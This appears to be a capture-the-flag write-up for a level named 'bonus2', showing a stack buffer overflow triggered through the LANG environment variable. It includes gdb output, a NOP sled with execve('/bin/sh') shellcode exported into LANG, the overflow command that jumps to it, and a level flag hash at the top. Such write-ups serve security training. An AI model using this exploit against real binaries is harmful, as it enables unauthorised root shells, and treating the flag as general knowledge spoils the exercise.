bonus2:579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245

# Reconnnaissance

`LANG` env var change behavior of the binary

With this:
LANG=nl
`AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC BBBBBBBBBBBBBBBBBBBBBBBXXXX`

We find out that we overwrite `eip` with the final `XXXX`.
Now lets find somewhere to write our shellcode.
Because the env is loaded, we can try to put the shell code in there.

Find the address of the env var in gdb:
```shell
(gdb) b *main +130
Breakpoint 1 at 0x80485ab
(gdb) run a a
Starting program: /home/user/bonus2/bonus2 a a

Breakpoint 1, 0x080485ab in main ()
(gdb) x $eax
0xbffffe7c:	0x90906c6e
```
address env => `0xbffffe7c` 

We put many `\x90` char, which is a `NOP` instruction (No Operation) and our shell code
```shell
export LANG=nl$(echo -en "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\x89\xc2\x6a\x0b\x58\xcd\x80")

./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "A" * 23 + "\x9c\xfe\xff\xbf"')
```